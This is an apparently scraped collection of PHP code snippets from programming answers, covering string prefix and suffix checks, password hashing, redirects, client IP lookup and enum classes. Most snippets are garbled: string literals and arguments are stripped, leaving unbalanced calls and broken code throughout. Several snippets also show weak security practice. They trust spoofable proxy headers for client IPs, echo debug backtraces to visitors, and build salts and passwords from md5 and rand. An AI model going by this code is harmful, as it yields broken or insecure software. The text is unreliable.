if(!defined( define( } $base_url = null; if (defined( { switch (ENVIRONMENT) { case $base_url = ini_set( ini_set( error_reporting(E_ALL|E_STRICT); break; case $base_url = error_reporting(0); break; default: exit( } }
function ERR_HANDLER($errno ,$errstr, $errfile, $errline){ $msg="<b>Someting bad happened.</b> [$errno] $errstr <br><br> <b>File:</b> $errfile <br> <b>Line:</b> $errline <br> <pre>".json_encode(debug_backtrace(), JSON_PRETTY_PRINT)."</pre> <br>"; echo $msg; return false; } function EXC_HANDLER($exception){ ERR_HANDLER(0,$exception->getMessage(),$exception->getFile(),$exception->getLine()); } function shutDownFunction() { $error = error_get_last(); if ($error["type"] == 1) { ERR_HANDLER($error["type"],$error["message"],$error["file"],$error["line"]); } } set_error_handler ("ERR_HANDLER", E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED); register_shutdown_function("shutdownFunction"); set_exception_handler("EXC_HANDLER");
<?php error_reporting(0); error_reporting(E_ERROR | E_WARNING | E_PARSE); error_reporting(E_ALL); ini_set("error_reporting", E_ALL); error_reporting(E_ALL & ~E_NOTICE); ?
xdebug.force_display_errors = 1; xdebug.force_error_reporting = -1;
function startsWith($haystack, $needle) { $length = strlen($needle); return (substr($haystack, 0, $length) === $needle); } function endsWith($haystack, $needle) { $length = strlen($needle); if ($length == 0) { return true; } return (substr($haystack, -$length) === $needle); }
function startsWith($haystack, $needle) { return $needle === || strrpos($haystack, $needle, -strlen($haystack)) !== false; } function endsWith($haystack, $needle) { if ($needle === return true; } $diff = \strlen($haystack) - \strlen($needle); return $diff >= 0 && strpos($haystack, $needle, $diff) !== false; }
startsWith( startsWith( startsWith( startsWith( startsWith( endsWith( endsWith( endsWith( endsWith( endsWith(
function substr_startswith($haystack, $needle) { return substr($haystack, 0, strlen($needle)) === $needle; } function preg_match_startswith($haystack, $needle) { return preg_match( } function substr_compare_startswith($haystack, $needle) { return substr_compare($haystack, $needle, 0, strlen($needle)) === 0; } function strpos_startswith($haystack, $needle) { return strpos($haystack, $needle) === 0; } function strncmp_startswith($haystack, $needle) { return strncmp($haystack, $needle, strlen($needle)) === 0; } function strncmp_startswith2($haystack, $needle) { return $haystack[0] === $needle[0] ? strncmp($haystack, $needle, strlen($needle)) === 0 : false; }
echo for($i = 0; $i < 100000; ++$i) { if($i % 2500 === 0) echo $test_cases[] = [ random_bytes(random_int(1, 7000)), random_bytes(random_int(1, 3000)), ]; } echo "done!\n"; $functions = [ $results = []; foreach($functions as $func) { $start = microtime(true); foreach($test_cases as $tc) { $func(...$tc); } $results[$func] = (microtime(true) - $start) * 1000; } asort($results); foreach($results as $func => $time) { echo "$func: " . number_format($time, 1) . " ms\n"; }
strncmp_startswith2: 40.2 ms strncmp_startswith: 42.9 ms substr_compare_startswith: 44.5 ms substr_startswith: 48.4 ms strpos_startswith: 138.7 ms preg_match_startswith: 13,152.4 ms
strncmp_startswith2: 477.9 ms strpos_startswith: 522.1 ms strncmp_startswith: 617.1 ms substr_compare_startswith: 706.7 ms substr_startswith: 756.8 ms preg_match_startswith: 10,200.0 ms
function startsWith($haystack,$needle,$case=true) { if ($case) return strpos($haystack, $needle, 0) === 0; return stripos($haystack, $needle, 0) === 0; } function endsWith($haystack,$needle,$case=true) { $expectedPosition = strlen($haystack) - strlen($needle); if ($case) return strrpos($haystack, $needle, 0) === $expectedPosition; return strripos($haystack, $needle, 0) === $expectedPosition; }
function startsWith($haystack, $needle, $case = true) { if ($case) { return (strcmp(substr($haystack, 0, strlen($needle)), $needle) === 0); } return (strcasecmp(substr($haystack, 0, strlen($needle)), $needle) === 0); } function endsWith($haystack, $needle, $case = true) { if ($case) { return (strcmp(substr($haystack, strlen($haystack) - strlen($needle)), $needle) === 0); } return (strcasecmp(substr($haystack, strlen($haystack) - strlen($needle)), $needle) === 0); }
function startsWith($needle, $haystack) { return preg_match( } function endsWith($needle, $haystack) { return preg_match( }
function startsWithChar($needle, $haystack) { return ($needle[0] === $haystack); } function endsWithChar($needle, $haystack) { return ($needle[strlen($needle) - 1] === $haystack); } $str= echo startsWithChar($str, echo endsWithChar($str, echo startsWithChar($str, echo endsWithChar($str,
function startsWith($haystack, $needle) { return strncmp($haystack, $needle, strlen($needle)) === 0; } function endsWith($haystack, $needle) { return $needle === }
function startsWith($haystack, $needle, $case=true) { if ($case) return strncasecmp($haystack, $needle, strlen($needle)) == 0; else return strncmp($haystack, $needle, strlen($needle)) == 0; }
$bStartsWith = strpos($sHaystack, $sNeedle) == 0; $bEndsWith = strrpos($sHaystack, $sNeedle) == strlen($sHaystack)-strlen($sNeedle);
function startsWith($haystack, $needle) { return (strpos($haystack, $needle) === 0); }
function endsWith($haystack, $needle) { return (strpos(strrev($haystack), strrev($needle)) === 0); }
function endsWith($haystack, $needle) { return substr($haystack,-strlen($needle))===$needle; }
function endsWith($haystack, $needle) { return substr($haystack,-strlen($needle))===$needle; } function endsWith2($haystack, $needle) { $length = strlen($needle); return $length === 0 || (substr($haystack, -$length) === $needle); } function endsWith3($haystack, $needle) { if ($needle === return true; } $diff = \strlen($haystack) - \strlen($needle); return $diff >= 0 && strpos($haystack, $needle, $diff) !== false; } function endsWith4($haystack, $needle) { return preg_match( } function timedebug() { $test = 10000000; $time1 = microtime(true); for ($i=0; $i < $test; $i++) { $tmp = endsWith( } $time2 = microtime(true); $result1 = $time2 - $time1; for ($i=0; $i < $test; $i++) { $tmp = endsWith2( } $time3 = microtime(true); $result2 = $time3 - $time2; for ($i=0; $i < $test; $i++) { $tmp = endsWith3( } $time4 = microtime(true); $result3 = $time4 - $time3; for ($i=0; $i < $test; $i++) { $tmp = endsWith4( } $time5 = microtime(true); $result4 = $time5 - $time4; echo $test. echo $test. echo $test. echo $test. exit; } timedebug();
10000000x endsWith: 1.5760900974274 seconds 10000000x endsWith2: 3.7102129459381 seconds 10000000x endsWith3: 1.8731069564819 seconds 10000000x endsWith4: 2.1521229743958 seconds
function startswith5b($haystack, $needle) { return ($haystack{0}==$needle{0})?strncmp($haystack, $needle, strlen($needle)) === 0:FALSE; }
Search a12345678c inside bcdefga12345678xbbbbb.....bbbbba12345678c
With strccmp, etc... is a===b? NO return false With strpos is a===b? NO -- iterating in haysack is a===c? NO is a===d? NO .... is a===g? NO is a===g? NO is a===a? YES is 1===1? YES -- iterating in needle is 2===3? YES is 4===4? YES .... is 8===8? YES is c===x? NO: oh God, is a===1? NO -- iterating in haysack again is a===2? NO is a===3? NO is a===4? NO .... is a===x? NO is a===b? NO is a===b? NO is a===b? NO is a===b? NO is a===b? NO is a===b? NO is a===b? NO ... ... may many times... ... is a===b? NO is a===a? YES -- iterating in needle again is 1===1? YES is 2===3? YES is 4===4? YES is 8===8? YES is c===c? YES YES YES I have found the same string! yay! was it at position 0? NOPE What you mean NO? So the string I found is useless? YEs. Damn. return false
require_once("vendor/autoload.php"); use Underscore\Types\String; $str = "there is a string"; echo( String::startsWith($str, echo( String::endsWith($str,
echo for($i = 0; $i < 100000; ++$i) { if($i % 2500 === 0) echo $haystack_length = random_int(1, 7000); $haystack = random_bytes($haystack_length); $needle_length = random_int(1, 3000); $overlap_length = min(random_int(0, $needle_length), $haystack_length); $needle = ($needle_length > $overlap_length) ? substr($haystack, 0, $overlap_length) . random_bytes($needle_length - $overlap_length) : substr($haystack, 0, $needle_length); $test_cases[] = [$haystack, $needle]; } echo " done!<br />";
strncmp_startswith: 223.0 ms substr_startswith: 228.0 ms substr_compare_startswith: 238.0 ms strncmp_startswith2: 253.0 ms strpos_startswith: 349.0 ms preg_match_startswith: 20,828.7 ms
function startsWith($haystack, $needle) { $length = mb_substr($needle, return (mb_substr($haystack, 0, $length, } function endsWith($haystack, $needle) { $length = mb_strlen($needle, return $length === 0 || (mb_substr($haystack, -$length, $length, }
$content = "The main string to search"; $search = "T"; if(stripos($content, $search) === 0) echo else echo if(strpos($content, $search) === 0) echo else echo if(stripos(strrev($content), strrev($search)) === 0) echo else echo if(strpos(strrev($content), strrev($search)) === 0) echo else echo
function startsWith( $haystack, $needle ){ return $needle === } function endsWith( $haystack, $needle ){ $len = strlen( $needle ); return $needle === }
var_dump( startsWith( var_dump( startsWith( var_dump(!startsWith( var_dump( startsWith( var_dump( startsWith( var_dump(!startsWith( var_dump(!startsWith( var_dump(!startsWith( var_dump( var_dump( endsWith( var_dump( endsWith( var_dump(!endsWith( var_dump( endsWith( var_dump(!endsWith( var_dump( endsWith( var_dump(!endsWith( var_dump(!endsWith(
function startsWith($str, $needle){ return substr($str, 0, strlen($needle)) === $needle; } function endsWith($str, $needle){ $length = strlen($needle); return !$length || substr($str, - $length) === $needle; }
function startsWith($haystack, $needle) { return substr($haystack, 0, strlen($needle)) == $needle; }
$haystack = "valuehaystack"; $needle = "value"; if (strpos($haystack, $needle) === 0){ echo "Found " . $needle . " at the beginning of " . $haystack . "!"; }
$haystack = "valuehaystack"; $needle = "haystack"; if (strpos($haystack, $needle) + strlen($needle) === strlen($haystack)){ echo "Found " . $needle . " at the end of " . $haystack . "!"; }
(strpos($stringToSearch, $doesItStartWithThis) === 0)
function startWith($haystack,$needle){ if(substr($haystack,0, strlen($needle))===$needle) return true; } function endWith($haystack,$needle){ if(substr($haystack, -strlen($needle))===$needle) return true; }
function startsWith($haystack,$needle) { if($needle==="") return true; if($haystack[0]<>$needle[0]) return false; if(substr_compare($haystack,$needle,0,strlen($needle))==0) return true; return false; }
function startsWith($haystack, $needle, $case=true) { if ($case) return strncmp($haystack, $needle, strlen($needle)) == 0; else return strncasecmp($haystack, $needle, strlen($needle)) == 0; } function endsWith($haystack, $needle, $case=true) { return startsWith(strrev($haystack),strrev($needle),$case); }
function endsWith($haystack, $needle, $case=true) { return preg_match("/.*{$needle}$/" . (($case) ? "" : "i"), $haystack); }
function startsWith($haystack, $needle) { return strpos($haystack, $needle) === 0 ? 1 : 0; } function endsWith($haystack, $needle) { return stripos($haystack, $needle) === 0 ? 1 : 0; } function startsWith($haystack, $needle) { return strpos($haystack, $needle) === 0 ? } function endsWith($haystack, $needle) { return stripos($haystack, $needle) === 0 ? }
function stringBeginsWith($haystack, $beginning, $caseInsensitivity = false) { if ($caseInsensitivity) return strncasecmp($haystack, $beginning, strlen($beginning)) === 0; else return strncmp($haystack, $beginning, strlen($beginning)) === 0; } function stringEndsWith($haystack, $ending, $caseInsensitivity = false) { if ($caseInsensitivity) return strcasecmp(substr($haystack, strlen($haystack) - strlen($ending)), $haystack) === 0; else return strpos($haystack, $ending, strlen($haystack) - strlen($ending)) !== false; }
$ends_with = strrchr($text, $start_with = (0 === strpos($text,
function startsWith($haystack,$needle) { substring($haystack,0,strlen($needle)) == $needle) { return true; } return false; } function endsWith($haystack,$needle) { if(substring($haystack,-strlen($needle)) == $needle) { return true; } return false; }
function startsWith($haystack,$needle) { return substring($haystack,0,strlen($needle)) == $needle); } function endsWith($haystack,$needle) { return substring($haystack,-strlen($needle)) == $needle); }
<?php echo password_hash( $options = [ ]; echo password_hash(
<?php $hash = if (password_verify( echo } else { echo }
class Bcrypt{ private $rounds; public function __construct($rounds = 12) { if (CRYPT_BLOWFISH != 1) { throw new Exception("bcrypt not supported in this installation. See http: } $this->rounds = $rounds; } public function hash($input){ $hash = crypt($input, $this->getSalt()); if (strlen($hash) > 13) return $hash; return false; } public function verify($input, $existingHash){ $hash = crypt($input, $existingHash); return $hash === $existingHash; } private function getSalt(){ $salt = sprintf( $bytes = $this->getRandomBytes(16); $salt .= $this->encodeBytes($bytes); return $salt; } private $randomState; private function getRandomBytes($count){ $bytes = if (function_exists( (strtoupper(substr(PHP_OS, 0, 3)) !== $bytes = openssl_random_pseudo_bytes($count); } if ($bytes === ($hRand = @fopen( $bytes = fread($hRand, $count); fclose($hRand); } if (strlen($bytes) < $count) { $bytes = if ($this->randomState === null) { $this->randomState = microtime(); if (function_exists( $this->randomState .= getmypid(); } } for ($i = 0; $i < $count; $i += 16) { $this->randomState = md5(microtime() . $this->randomState); if (PHP_VERSION >= $bytes .= md5($this->randomState, true); } else { $bytes .= pack( } } $bytes = substr($bytes, 0, $count); } return $bytes; } private function encodeBytes($input){ $itoa64 = $output = $i = 0; do { $c1 = ord($input[$i++]); $output .= $itoa64[$c1 >> 2]; $c1 = ($c1 & 0x03) << 4; if ($i >= 16) { $output .= $itoa64[$c1]; break; } $c2 = ord($input[$i++]); $c1 |= $c2 >> 4; $output .= $itoa64[$c1]; $c1 = ($c2 & 0x0f) << 2; $c2 = ord($input[$i++]); $c1 |= $c2 >> 6; $output .= $itoa64[$c1]; $output .= $itoa64[$c2 & 0x3f]; } while (true); return $output; } }
$bcrypt = new Bcrypt(15); $hash = $bcrypt->hash( $isGood = $bcrypt->verify(
function register($username, $password) { $hash = password_hash($password, PASSWORD_BCRYPT); save($username, $hash); } function login($username, $password) { $hash = loadHashByUsername($username); if (password_verify($password, $hash)) { } else { } }
function register($username, $password) { $bcrypt = new Zend\Crypt\Password\Bcrypt(); $hash = $bcrypt->create($password); save($user, $hash); } function login($username, $password) { $hash = loadHashByUsername($username); $bcrypt = new Zend\Crypt\Password\Bcrypt(); if ($bcrypt->verify($password, $hash)) { } else { } }
function register($username, $password) { $lib = new PasswordLib\PasswordLib(); $hash = $lib->createPasswordHash($password, save($user, $hash); } function login($username, $password) { $hash = loadHashByUsername($username); $lib = new PasswordLib\PasswordLib(); if ($lib->verifyPasswordHash($password, $hash)) { } else { } }
function register($username, $password) { $phpass = new PasswordHash(12, false); $hash = $phpass->HashPassword($password); save($user, $hash); } function login($username, $password) { $hash = loadHashByUsername($username); $phpass = new PasswordHash(12, false); if ($phpass->CheckPassword($password, $hash)) { } else { } }
function blowfishCrypt($password,$cost) { $chars= $salt=sprintf( mt_srand(); for($i=0;$i<22;$i++) $salt.=$chars[mt_rand(0,63)]; return crypt($password,$salt); }
$hash=blowfishCrypt( $hash=blowfishCrypt( if(crypt(
$hashToStoreInDb = password_hash($password, PASSWORD_BCRYPT); $isPasswordCorrect = password_verify($password, $existingHashFromDb);
$hash = password_hash($password, PASSWORD_BCRYPT, array("cost" => 11));
$bcrypt = new \Zend\Crypt\Password\Bcrypt; $bcrypt->create("youpasswordhere", 10)
$password = $hash = password_hash($password, PASSWORD_DEFAULT); $expensiveHash = password_hash($password, PASSWORD_DEFAULT, array( password_verify( password_verify( password_verify(
$t_hasher = new PasswordHash(8, FALSE); $hash = $t_hasher->HashPassword($password);
$t_hasher = new PasswordHash(8, FALSE); $check = $t_hasher->CheckPassword($password, $hash);
<?php /* * Password hashing with PBKDF2. * Author: havoc AT defuse.ca * www: https: */ define("PBKDF2_HASH_ALGORITHM", "sha256"); define("PBKDF2_ITERATIONS", 1000); define("PBKDF2_SALT_BYTES", 24); define("PBKDF2_HASH_BYTES", 24); define("HASH_SECTIONS", 4); define("HASH_ALGORITHM_INDEX", 0); define("HASH_ITERATION_INDEX", 1); define("HASH_SALT_INDEX", 2); define("HASH_PBKDF2_INDEX", 3); function create_hash($password) { $salt = base64_encode(mcrypt_create_iv(PBKDF2_SALT_BYTES, MCRYPT_DEV_URANDOM)); return PBKDF2_HASH_ALGORITHM . ":" . PBKDF2_ITERATIONS . ":" . $salt . ":" . base64_encode(pbkdf2( PBKDF2_HASH_ALGORITHM, $password, $salt, PBKDF2_ITERATIONS, PBKDF2_HASH_BYTES, true )); } function validate_password($password, $good_hash) { $params = explode(":", $good_hash); if(count($params) < HASH_SECTIONS) return false; $pbkdf2 = base64_decode($params[HASH_PBKDF2_INDEX]); return slow_equals( $pbkdf2, pbkdf2( $params[HASH_ALGORITHM_INDEX], $password, $params[HASH_SALT_INDEX], (int)$params[HASH_ITERATION_INDEX], strlen($pbkdf2), true ) ); } function slow_equals($a, $b) { $diff = strlen($a) ^ strlen($b); for($i = 0; $i < strlen($a) && $i < strlen($b); $i++) { $diff |= ord($a[$i]) ^ ord($b[$i]); } return $diff === 0; } /* * PBKDF2 key derivation function as defined by RSA * $algorithm - The hash algorithm to use. Recommended: SHA256 * $password - The password. * $salt - A salt that is unique to the password. * $count - Iteration count. Higher is better, but slower. Recommended: At least 1000. * $key_length - The length of the derived key in bytes. * $raw_output - If true, the key is returned in raw binary format. Hex encoded otherwise. * Returns: A $key_length-byte key derived from the password and salt. * * Test vectors can be found here: https: * * This implementation of PBKDF2 was originally created by https: * With improvements by http: */ function pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output = false) { $algorithm = strtolower($algorithm); if(!in_array($algorithm, hash_algos(), true)) die( if($count <= 0 || $key_length <= 0) die( $hash_length = strlen(hash($algorithm, "", true)); $block_count = ceil($key_length / $hash_length); $output = ""; for($i = 1; $i <= $block_count; $i++) { $last = $salt . pack("N", $i); $last = $xorsum = hash_hmac($algorithm, $last, $password, true); for ($j = 1; $j < $count; $j++) { $xorsum ^= ($last = hash_hmac($algorithm, $last, $password, true)); } $output .= $xorsum; } if($raw_output) return substr($output, 0, $key_length); else return bin2hex(substr($output, 0, $key_length)); } ?>
/** * Generating string * @param $size * @return string */ function Uniwur_string($size){ $text = md5(uniqid(rand(), TRUE)); RETURN substr($text, 0, $size); }
/** * Hashing string * @param $string * @return string */ function hash($string){ return hash( }
$password = Uniwur_string(20); $salt = Uniwur_string(32); $hash_salt = hash($salt); $hash_psw = hash($password.$hash_salt);
function Redirect($url, $permanent = false) { header( exit(); } Redirect(
function redirect($url, $statusCode = 303) { header( die(); }
<meta http-equiv="refresh" content="0;url=finalpage.html">
function Redirect($url, $permanent = false) { if (headers_sent() === false) { header( } exit(); } Redirect(
<?php header( $fh = fopen( fwrite($fh, $_SERVER[ fclose($fh); ?>
bart@hal9k:~> cat /tmp/track.txt 127.0.0.1 2009-04-21T09:50:02+02:00 127.0.0.1 2009-04-21T09:50:05+02:00 127.0.0.1 2009-04-21T09:50:08+02:00
$url = $url .= rtrim(dirname($_SERVER[ $url .= header(
<?php session_start(); if ( !isset( $_SESSION["valid_user"]) ) { header("location:../"); die(); } ?>
function Redirect($url, $code = 302) { if (strncmp( { if (headers_sent() !== true) { if (strlen(session_id()) > 0) { session_regenerate_id(true); session_write_close(); } if (strncmp( { header(sprintf( } header( } exit(); } }
1)self.location="http: 2)window.location.href="http: 3)document.location.href = 4)window.location.replace("http:
<?php header( header( echo "<script>location.href= ?>
echo "I am a web developer"; header("Location: /index.php");
<?php header("location:./"); header("location:index.php"); header("location:example.php"); ?>
<?php $myVar = "bskud"; if ($myVar == "bskud") { ?> <script> window.location.href="https:
<?php $url = "targetpage" Function redirect$url(){ If (headers_sent()) == false{ Echo }} ?>
ob_start(); header("Location: ".$website); ob_end_flush();
$your_target_url = “www.example.com/index.php”; header(“Location : $your_target_url”); exit();
<?php function authRedirect($get_auth_level, $required_level, $if_fail_link = “www.example.com/index.php”){ if($get_auth_level != $required_level){ header(location : $if_fail_link); return false; exit(); }else{ return true; } } . . .
<?php require “function.php” authRedirect($_SESSION[‘u_auth’], 5); authRedirect($_SESSION[‘u_auth’], 4); authRedirect($_SESSION[‘u_auth’], 2, “www.someotherplace.com/somepage.php”); . . .
<?php $id = 2; header("Location: index.php?id=$id&msg=succesfully redirect"); ?>
if (!empty($_SERVER[ $ip = $_SERVER[ } elseif (!empty($_SERVER[ $ip = $_SERVER[ } else { $ip = $_SERVER[ }
class RemoteAddress { /** * Whether to use proxy addresses or not. * * As default this setting is disabled - IP address is mostly needed to increase * security. HTTP_* are not reliable since can easily be spoofed. It can be enabled * just for more flexibility, but if user uses proxy to connect to trusted services * it * * @var bool */ protected $useProxy = false; /** * List of trusted proxy IP addresses * * @var array */ protected $trustedProxies = array(); /** * HTTP header to introspect for proxies * * @var string */ protected $proxyHeader = /** * Returns client IP address. * * @return string IP address. */ public function getIpAddress() { $ip = $this->getIpAddressFromProxy(); if ($ip) { return $ip; } if (isset($_SERVER[ return $_SERVER[ } return } /** * Attempt to get the IP address for a proxied client * * @see http: * @return false|string */ protected function getIpAddressFromProxy() { if (!$this->useProxy || (isset($_SERVER[ ) { return false; } $header = $this->proxyHeader; if (!isset($_SERVER[$header]) || empty($_SERVER[$header])) { return false; } $ips = explode( $ips = array_map( $ips = array_diff($ips, $this->trustedProxies); if (empty($ips)) { return false; } $ip = array_pop($ips); return $ip; } }
function getUserIP() { $ipaddress = if (isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else $ipaddress = return $ipaddress; }
function get_ip_address() { if (!empty($_SERVER[ return $_SERVER[ } if (!empty($_SERVER[ if (strpos($_SERVER[ $iplist = explode( foreach ($iplist as $ip) { if (validate_ip($ip)) return $ip; } } else { if (validate_ip($_SERVER[ return $_SERVER[ } } if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ return $_SERVER[ return $_SERVER[ } /** * Ensures an ip address is both a valid IP and does not fall within * a private network range. */ function validate_ip($ip) { if (strtolower($ip) === return false; $ip = ip2long($ip); if ($ip !== false && $ip !== -1) { $ip = sprintf( if ($ip >= 0 && $ip <= 50331647) return false; if ($ip >= 167772160 && $ip <= 184549375) return false; if ($ip >= 2130706432 && $ip <= 2147483647) return false; if ($ip >= 2851995648 && $ip <= 2852061183) return false; if ($ip >= 2886729728 && $ip <= 2887778303) return false; if ($ip >= 3221225984 && $ip <= 3221226239) return false; if ($ip >= 3232235520 && $ip <= 3232301055) return false; if ($ip >= 4294967040) return false; } return true; }
<?php $ip= $ip=$_SERVER[ $clientDetails = json_decode(file_get_contents("http: echo "You ?>
if ( isset($_SERVER[ $ip = $_SERVER[ } elseif ( isset($_SERVER[ $ip = $_SERVER[ } else { $ip = (isset($_SERVER[ } $ip = filter_var($ip, FILTER_VALIDATE_IP); $ip = ($ip === false) ?
$ip = ""; if (!empty($_SERVER["HTTP_CLIENT_IP"])) { $ip = $_SERVER["HTTP_CLIENT_IP"]; } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) { $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } echo $ip;
function getClientIP() { if (isset($_SERVER)) { if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) return $_SERVER["HTTP_X_FORWARDED_FOR"]; if (isset($_SERVER["HTTP_CLIENT_IP"])) return $_SERVER["HTTP_CLIENT_IP"]; return $_SERVER["REMOTE_ADDR"]; } if (getenv( return getenv( if (getenv( return getenv( return getenv( }
<?php echo GetClientIP(true); function GetClientIP($validate = False){ $ipkeys = array( ); $ip = array(); foreach($ipkeys as $keyword){ if( isset($_SERVER[$keyword]) ){ if($validate){ if( ValidatePublicIP($_SERVER[$keyword]) ){ $ip[] = $_SERVER[$keyword]; } }else{ $ip[] = $_SERVER[$keyword]; } } } $ip = ( empty($ip) ? return $ip; } function ValidatePublicIP($ip){ if(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { return true; } else { return false; } }
function GetIP() { if ( getenv("HTTP_CLIENT_IP") ) { $ip = getenv("HTTP_CLIENT_IP"); } elseif ( getenv("HTTP_X_FORWARDED_FOR") ) { $ip = getenv("HTTP_X_FORWARDED_FOR"); if ( strstr($ip, $tmp = explode( $ip = trim($tmp[0]); } } else { $ip = getenv("REMOTE_ADDR"); } return $ip; }
$ip = filter_input(INPUT_SERVER, ?: filter_input(INPUT_SERVER, ?: $_SERVER[ ??
function get_client_ip() { $ipaddress = if (getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else $ipaddress = return $ipaddress; }
if(($ip=filter_input(INPUT_SERVER, exit; } echo $ip;
if (!empty($_SERVER[ $ip = $_SERVER[ } elseif (!empty($_SERVER[ $ip = $_SERVER[ } else { $ip = $_SERVER[ }
function valid_ip($ip) { return $ip && substr($ip, 0, 4) != } function get_client_ip() { return @$_SERVER[ @$_SERVER[ valid_ip(@$_SERVER[ } echo get_client_ip();
function doSomething() { require_once(xyz.php); .... }
abstract class DaysOfWeek { const Sunday = 0; const Monday = 1; } $today = DaysOfWeek::Sunday;
abstract class BasicEnum { private static $constCacheArray = NULL; private static function getConstants() { if (self::$constCacheArray == NULL) { self::$constCacheArray = []; } $calledClass = get_called_class(); if (!array_key_exists($calledClass, self::$constCacheArray)) { $reflect = new ReflectionClass($calledClass); self::$constCacheArray[$calledClass] = $reflect->getConstants(); } return self::$constCacheArray[$calledClass]; } public static function isValidName($name, $strict = false) { $constants = self::getConstants(); if ($strict) { return array_key_exists($name, $constants); } $keys = array_map( return in_array(strtolower($name), $keys); } public static function isValidValue($value, $strict = true) { $values = array_values(self::getConstants()); return in_array($value, $values, $strict); } }
abstract class DaysOfWeek extends BasicEnum { const Sunday = 0; const Monday = 1; const Tuesday = 2; const Wednesday = 3; const Thursday = 4; const Friday = 5; const Saturday = 6; } DaysOfWeek::isValidName( DaysOfWeek::isValidName( DaysOfWeek::isValidName( DaysOfWeek::isValidName( DaysOfWeek::isValidName(0); DaysOfWeek::isValidValue(0); DaysOfWeek::isValidValue(5); DaysOfWeek::isValidValue(7); DaysOfWeek::isValidValue(
<?php class YourClass { const SOME_CONSTANT = 1; public function echoConstant() { echo self::SOME_CONSTANT; } } echo YourClass::SOME_CONSTANT; $c = new YourClass; $c->echoConstant();
private static $constCacheArray = null; private static function getConstants() { if (self::$constCacheArray === null) self::$constCacheArray = array(); $calledClass = get_called_class(); if (!array_key_exists($calledClass, self::$constCacheArray)) { $reflect = new \ReflectionClass($calledClass); self::$constCacheArray[$calledClass] = $reflect->getConstants(); } return self::$constCacheArray[$calledClass]; }
interface DaysOfWeek { const Sunday = 0; const Monday = 1; } var $today = DaysOfWeek::Sunday;
class Enum { const NAME = const SOME_VALUE = } print Enum::NAME;
class SomeTypeName { private static $enum = array(1 => "Read", 2 => "Write"); public function toOrdinal($name) { return array_search($name, self::$enum); } public function toString($ordinal) { return self::$enum[$ordinal]; } }
SomeTypeName::toOrdinal("Read"); SomeTypeName::toString(1);
abstract class Enum { const NONE = null; final private function __construct() { throw new NotSupportedException(); } final private function __clone() { throw new NotSupportedException(); } final public static function toArray() { return (new ReflectionClass(static::class))->getConstants(); } final public static function isValid($value) { return in_array($value, static::toArray()); } }
final class ResponseStatusCode extends Enum { const OK = 200; const CREATED = 201; const ACCEPTED = 202; const SERVICE_UNAVAILABLE = 503; const GATEWAY_TIME_OUT = 504; const HTTP_VERSION_NOT_SUPPORTED = 505; }
final class TestEnum { private static $_values = [ ]; private static $_instances = []; public static function __getStatic($name) { if (isset(static::$_values[$name])) { if (empty(static::$_instances[$name])) { static::$_instances[$name] = new static($name); } return static::$_instances[$name]; } throw new Exception(sprintf( } private $_value; public function __construct($name) { $this->_value = static::$_values[$name]; } public function __equals($object) { if ($object instanceof static) { return $object->_value === $this->_value; } return $object === $this->_value; } } $foo = TestEnum::$FOO; $zap = TestEnum::$ZAP; $qux = TestEnum::$QUX; TestEnum::$QUX == $qux;
abstract class TypedEnum { private static $_instancedValues; private $_value; private $_name; private function __construct($value, $name) { $this->_value = $value; $this->_name = $name; } private static function _fromGetter($getter, $value) { $reflectionClass = new ReflectionClass(get_called_class()); $methods = $reflectionClass->getMethods(ReflectionMethod::IS_STATIC | ReflectionMethod::IS_PUBLIC); $className = get_called_class(); foreach($methods as $method) { if ($method->class === $className) { $enumItem = $method->invoke(null); if ($enumItem instanceof $className && $enumItem->$getter() === $value) { return $enumItem; } } } throw new OutOfRangeException(); } protected static function _create($value) { if (self::$_instancedValues === null) { self::$_instancedValues = array(); } $className = get_called_class(); if (!isset(self::$_instancedValues[$className])) { self::$_instancedValues[$className] = array(); } if (!isset(self::$_instancedValues[$className][$value])) { $debugTrace = debug_backtrace(); $lastCaller = array_shift($debugTrace); while ($lastCaller[ { $lastCaller = array_shift($debugTrace); } self::$_instancedValues[$className][$value] = new static($value, $lastCaller[ } return self::$_instancedValues[$className][$value]; } public static function fromValue($value) { return self::_fromGetter( } public static function fromName($value) { return self::_fromGetter( } public function getValue() { return $this->_value; } public function getName() { return $this->_name; } }
final class DaysOfWeek extends TypedEnum { public static function Sunday() { return self::_create(0); } public static function Monday() { return self::_create(1); } public static function Tuesday() { return self::_create(2); } public static function Wednesday() { return self::_create(3); } public static function Thursday() { return self::_create(4); } public static function Friday() { return self::_create(5); } public static function Saturday() { return self::_create(6); } }
function saveEvent(DaysOfWeek $weekDay, $comment) { $myDatabase->save( array( array( } saveEvent(DaysOfWeek::Monday(),
$monday1 = DaysOfWeek::Monday(); $monday2 = DaysOfWeek::Monday(); $monday1 === $monday2;
function getGermanWeekDayName(DaysOfWeek $weekDay) { switch ($weekDay) { case DaysOfWeek::Monday(): return case DaysOfWeek::Tuesday(): return }
$monday = DaysOfWeek::fromValue(2); $tuesday = DaysOfWeek::fromName(
$wednesday = DaysOfWeek::Wednesday() echo $wednesDay->getName();
